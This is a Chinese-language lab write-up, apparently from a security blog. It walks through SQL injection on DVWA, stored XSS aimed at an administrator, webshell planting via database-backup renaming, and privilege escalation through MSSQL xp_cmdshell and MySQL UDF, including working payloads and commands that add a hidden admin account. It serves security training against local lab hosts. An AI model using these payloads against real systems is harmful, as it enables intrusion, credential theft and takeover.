...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_77908)
>
>3.在链接后面添加语句【union select 1,admin,password,4,5,6,7,8,9,10,11 from admin】，即可暴出管理员用户名和密码。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_20598)
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_48342)
>
>2.尝试输入’，返回错误，可以得知此处为注入点。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_58203)
>
>3.尝试输入：`1 or 1=1`,想要遍历数据库表，并没有达成目的，猜测程序将此处看成了**字符型**。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_24591)
>
>4.尝试输入：`1’ or’ 1’=’1`后遍历出了数据库中的所有内容。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_87635)
>
>5.利用order by num语句来测试数据表有多少个字段。（--加空格）表示注释掉sql语句末尾的单引号。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_15397)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_23692)
>
>8.通过注入：`1' and 1=2 union select user(),database() --`得到数据库用户以及数据库名称。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_62655)
>
>9.通过注入：`1' and 1=2 union select version(),database() -- `得到数据库版本信息。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_83473)
>
>10.通过注入：
>
>```
...
>获得操作系统信息。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_94423)
>
>11.通过注入：`1' and 1=2 union select 1,schema_name from information_schema.schemata -- `查询所有数据库名字。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_21763)
>
>12.通过注入：`1' and exists(select * from 表名) --`猜解dvwa数据库中的表名。测试表名为users。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_36450)
>
>13.猜解字段名：`1' and exists(select 表名 from users) --`,测试的字段名为first_name,last_name。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_21940)
>
>14.爆出数据库中字段的内容`1' and 1=2 union select first_name,last_name from users --`,这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_94412)

**源码分析：**

![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_37330)
...
![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_95600)
...
![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_75240)
...
>1.注册一个用户。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/153227573954710301.png)
>
>2.来到“添加物品”处。此处是存在存储型XSS的。添加以下信息，点击“提交”。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/153227579231763301.png)
>
>3.点击“首页”，看到刚才添加的物品信息，点击打开。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/153227764879648801.png)
>
>4.弹出信息。说明漏洞存在。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/153227582202931401.png)
>
>5.再次编辑“添加物品”处提交的内容，其中“物品简介”项的内容如下：
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/153227585654707901.png)
>
>```javascript
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/153227589217491001.png)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/153227591930220601.png)
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_50354)
>
>3.交互界面返回信息。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_49113)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/159987942144342601.png)
>
>6.显示提交成功，我们继续提交下一段代码`<script>alert(/xss/)/*`来配合上一段代码执行。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_30155)
>
>7.当管理员进入管理后台，进入留言管理，会触发用户输入的恶意代码，成功弹窗。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_25663)
>
...
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_60835)
>
> 3.打开【系统管理】下的【数据库备份】，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径中，填写数据库备份名称【ok.asp】。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_89605)
>
> 4.点击【确定】，即可得到数据库备份的路径【admin\Databackup\ok.asp.asa】。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_19747)
>
> 5.在火狐浏览器的地址栏中输入完整路径【`http://192.168.1.3:8002/admin/Databackup/ok.asp`】，即可访问木马，已经成功拿到webshell（密码：123456）。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_88492)
...
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_51557)
>
> 2.判断fckeditor编辑器版本号，输入：`http://192.168.1.3:8001/FCKeditor/_whatsnew.html`，由返回页面可知此fckeditor编辑器版本为2.0。
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_87280)
>
...
>
> ![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_51147)
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_30341)
>
>2. 单击“端口扫描”->“开始扫描”, 发现**1433**端口开放，安装有mssql数据库。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_61664)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_68630)
>
>4. 命令回显为1，cmd_shell为开启。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_48438)
>
>5. 添加系统账号,在SQL操作命令中输入“Exec master.dbo.xp_cmdshell ‘net user hacker 123456 /add’”，没有回显表示命令成功。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_43746)
>
>6. 在SQL操作命令中输入” Exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker /add’ “将hacker加入管理员组。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_74951)
>
>7. 单击”scan”按钮，查看端口号。发现3389端口开启着。 *3389*是远程协助的端口。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_46848)
>
...
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_33432)
>
>2.单击“端口扫描”->“开始扫描”, 发现**3306**端口开放，安装有Mysql数据库。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_57333)
>
>3.利用Mysql_udf提权，单击“mysql-udf提权”，在右侧输入已知的数据库连接用户名和密码（root:123456）,然后单击MYSQL连接即可。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_65201)
>
>4.单击“安装DLL”按钮。
>
>5.在下拉列表框中选择”添加管理员”,单击”执行”按钮。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_68169)
>
>6.在下拉列表框中选择”设为管理组”,单击”执行”按钮并加入管理员组。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_76818)
>
>7.选择菜单栏中的“CMD命令”，下拉列表框中选择“net user”,然后单击“执行按钮”。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_66143)
>
>8.选择菜单栏中的“CMD命令”，下拉列表框中选择“netstat -an”,然后单击“执行按钮”。
>
>![](https://cdn.jsdelivr.net/gh/839777408/tupian/blog/20_63628)
>
